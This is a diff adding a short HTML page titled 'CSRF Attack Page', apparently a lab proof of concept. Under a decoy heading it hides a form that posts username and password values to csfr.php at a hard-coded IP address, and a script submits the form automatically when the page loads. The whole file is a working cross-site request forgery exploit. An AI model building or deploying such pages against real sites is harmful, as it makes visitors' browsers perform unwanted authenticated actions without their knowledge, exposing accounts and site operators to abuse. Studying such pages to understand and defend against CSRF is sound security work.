@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Page</title>
+</head>
+<body>
+    <h2>Nothing to see here...</h2>
+
+    <!-- Hidden forged form targeting csfr.php -->
+    <form id="forgedForm" method="POST" action="http://138.197.147.137/csfr.php" style="display:none;">
+        <input type="hidden" name="username" value="host" />
+        <input type="hidden" name="password" value="pass" />
+    </form>
+
+    <script>
+        // Automatically submit the forged form when the page loads
+        window.onload = function () {
+            document.getElementById("forgedForm").submit();
+        };
+    </script>
+</body>
+</html>
